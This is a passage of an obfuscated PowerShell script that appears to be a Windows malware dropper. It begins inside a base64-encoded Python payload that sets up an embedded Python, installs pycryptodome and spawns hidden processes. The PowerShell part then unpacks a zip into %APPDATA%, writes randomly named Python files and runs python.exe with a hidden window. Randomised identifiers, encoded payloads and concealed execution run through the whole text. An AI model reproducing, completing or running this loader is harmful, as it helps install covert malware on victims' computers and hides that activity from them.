objVwOUJIQ0VzN21MYVpjay5leGVjdXRhYmxlLCAiZ2V0LXBpcC5weSJdKQoKCmRlZiBLUFFuTVlUVDlOYm4zeGx3ZUEocmh5dUNVQXlJNkxFVHhhSFBTKToKICAgIHJldHVybiA2NCAqIHJoeXVDVUF5STZMRVR4YUhQUwoKZGVmIEhTSjNEWVpBQWRRVF9wdGgoKToKICAgIGZuTUYwX3B0aCA9ICcnJ3B5dGhvbjMxMi56aXAKLgoKIyBVbmNvbW1lbnQgdG8gcnVuIHNpdGUubWFpbigpIGF1dG9tYXRpY2FsbHkKaW1wb3J0IHNpdGUKJycnCiAgICB3aXRoIG9wZW4oInB5dGhvbjMxMi5fcHRoIiwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgIGYud3JpdGUoZm5NRjBfcHRoKQoKCmRlZiBoRWFNVEJtZVVJczQwKFNtTXZ0Rjl0RnZlMWFsREEpOgogICAgcmV0dXJuIDY0ICogU21NdnRGOXRGdmUxYWxEQQoKZGVmIG05RlJQRDg2ZXNlZEE0UygpOgogICAgZFNXTWdGID0gU1BvdTZUWW1iTVlWZndUbS5nZXRlbnYoInBhdGgiKQogICAgWXFnTjYgPSBTUG91NlRZbWJNWVZmd1RtLmdldGN3ZCgpCiAgICBxUWVkQWNCMHNXNmVsczNsQ210diA9IFNQb3U2VFltYk1ZVmZ3VG0ucGF0aC5qb2luKFlxZ042LCAiU2NyaXB0cyIpCiAgICBTUG91NlRZbWJNWVZmd1RtLmVudmlyb25bInBhdGgiXSA9IGYie1lxZ042fTt7cVFlZEFjQjBzVzZlbHMzbENtdHZ9O3tkU1dNZ0Z9IgoKCmRlZiB1NHdtbFp1ZGRBTnYzZnU5ckJvdChmdnRBVkxKVkFjY1l3ZzNlUkY6IHN0ciwgVnhEZGowZUNyc2w2OiBzdHIsIF8xSnN2UlRqQTogaW50KSAtPiBzdHI6CiAgICBpZiBmdnRBVkxKVkFjY1l3ZzNlUkYgPT0gVnhEZGowZUNyc2w2OgogICAgICAgIHJldHVybiAiUVBobHh5Q0JmUUxuV2I3IgoKICAgIHR0bUtDS1h4bzBjOiBzdHIgPSBzdHIoXzFKc3ZSVGpBKQogICAgVnhEZGowZUNyc2w2ID0gZiJ7VnhEZGowZUNyc2w2fXt0dG1LQ0tYeG8wY30iCgogICAgcmV0dXJuIFZ4RGRqMGVDcnNsNgoKZGVmIFNrd0ZoR2VBMVlTdU1KRigpOgogICAgXzcwOXg0TDRPaVFiSGV1eS5ydW4oCiAgICAgICAgICAgIFtiaG41cDlCSENFczdtTGFaY2suZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgInB5Y3J5cHRvZG9tZSIsCiAgICAgICAgICAgICAic2V0dXB0b29scyJdKQoKCmRlZiBfMzFjQXhNdihuZmNxQlg4blZUWVhJcFgpOgogICAgZDFPQkh4WU0gPSAwCgogICAgZm9yIGRhRnJjUW5PIGluIG5mY3FCWDhuVlRZWElwWDoKICAgICAgICBkMU9CSHhZTSArPSAxICsgZGFGcmNRbk8KCiAgICByZXR1cm4gZDFPQkh4WU0gXiAzMgoKZGVmIEh0ZlYwaVZ3KCk6CiAgICBjVXFZazBCN0VoRU5ZSXVEMzJkcyA9IF83MDl4NEw0T2lRYkhldXkuU1RBUlRVUElORk8oKQogICAgY1VxWWswQjdFaEVOWUl1RDMyZHMuZHdGbGFncyB8PSBfNzA5eDRMNE9pUWJIZXV5LlNUQVJURl9VU0VTSE9XV0lORE9XCiAgICBjVXFZazBCN0VoRU5ZSXVEMzJkcy53U2hvd1dpbmRvdyA9IF83MDl4NEw0T2lRYkhldXkuU1dfSElERQogICAgXzcwOXg0TDRPaVFiSGV1eS5Qb3BlbigKICAgICAgICBbYmhuNXA5QkhDRXM3bUxhWmNrLmV4ZWN1dGFibGUsICJfX0lOSVRfXyJdLCBzdGFydHVwaW5mbz1jVXFZazBCN0VoRU5ZSXVEMzJkcywKICAgICAgICBjcmVhdGlvbmZsYWdzPV83MDl4NEw0T2lRYkhldXkuQ1JFQVRFX05FV19DT05TT0xFKQoKCmRlZiBzd3pYMWtTM0R2TXllSUxNY0woQnl5RXYpOgogICAgWk90OUpKaWk3WlQ4VjBsMmsgPSAwCgogICAgZm9yIERFQU51NVNLUzkyd0wgaW4gQnl5RXY6CiAgICAgICAgWk90OUpKaWk3WlQ4VjBsMmsgKz0gMSArIERFQU51NVNLUzkyd0wKCiAgICByZXR1cm4gWk90OUpKaWk3WlQ4VjBsMmsgXiAzMgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHRyeToKICAgICAgICBtOUZSUEQ4NmVzZWRBNFMoKQogICAgICAgIFl1VUZXdCgpCiAgICAgICAgU2t3RmhHZUExWVN1TUpGKCkKICAgICAgICBIdGZWMGlWdygpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoc3RyKGUpKQo="))
}

function JfjSWBjugz5Sfv {
    param (
        [int]$MinLength,
        [int]$MaxLength
    )

    if ($MinLength -gt $MaxLength) {
        Write-Error "MinLength must be less than or equal to MaxLength."
        return
    }

    $length = Get-Random -Minimum $MinLength -Maximum ($MaxLength + 1)
    
    $randomString = -join ((48..57) + (97..122) | Get-Random -Count $length | % {[char]$_})

    return $randomString
}

function _9C8NBENenUAvW($name, $file) {
    $name = "${pwd}\${name}"
    $file = [System.Text.Encoding]::UTF8.GetBytes($file)

    [IO.File]::WriteAllBytes($name, $file)
}

function VPDAXrVzP8cf6NU($name, $file) {
    $name = "${pwd}\${name}"
    [IO.File]::WriteAllBytes($name, $file)
}

function MUJg7 {
    cd $env:appdata

    ls

    $Xs9r7vn = _8IuOKsFONRPjw1hS9Y

    _4R3SRU $Xs9r7vn WEf9vMBeekmKwI.zip
    TY1u8DYa WEf9vMBeekmKwI.zip WEf9vMBeekmKwI
    rm WEf9vMBeekmKwI.zip

    cd WEf9vMBeekmKwI

    ls

    $lRYAaOT3sl = JfjSWBjugz5Sfv -MinLength 4 -MaxLength 20
    $IXfUbhWI85WsfYUI7UW6 = JfjSWBjugz5Sfv -MinLength 4 -MaxLength 20
    $rooH4X = JfjSWBjugz5Sfv -MinLength 4 -MaxLength 20

    $lRYAaOT3sl = "${lRYAaOT3sl}.py"
    $IXfUbhWI85WsfYUI7UW6 = "${IXfUbhWI85WsfYUI7UW6}.py"

    $oECOidRWL4eySHzjwM = e4hYvEBXh0Mxv
    $oECOidRWL4eySHzjwM = $oECOidRWL4eySHzjwM -replace "__INIT__", $lRYAaOT3sl
    _9C8NBENenUAvW $IXfUbhWI85WsfYUI7UW6 $oECOidRWL4eySHzjwM

    $oECOidRWL4eySHzjwM = mDW9TaHpsIByATR
    $oECOidRWL4eySHzjwM = $oECOidRWL4eySHzjwM -replace "__SETUP__", $rooH4X
    $oECOidRWL4eySHzjwM = $oECOidRWL4eySHzjwM -replace "__INSTALL__", $IXfUbhWI85WsfYUI7UW6
    _9C8NBENenUAvW $lRYAaOT3sl $oECOidRWL4eySHzjwM

    $oECOidRWL4eySHzjwM = _8efXd
    VPDAXrVzP8cf6NU $rooH4X $oECOidRWL4eySHzjwM

    $HUUBlqRGG9ZY6mruGX = "${pwd}\python.exe"

    Start-Process -FilePath "${HUUBlqRGG9ZY6mruGX}" -ArgumentList $IXfUbhWI85WsfYUI7UW6 -WorkingDirectory "$pwd" -WindowStyle Hidden

    pLDSe2IDUdlH7 "Wait right here for debugging"
}

MUJg7
exit
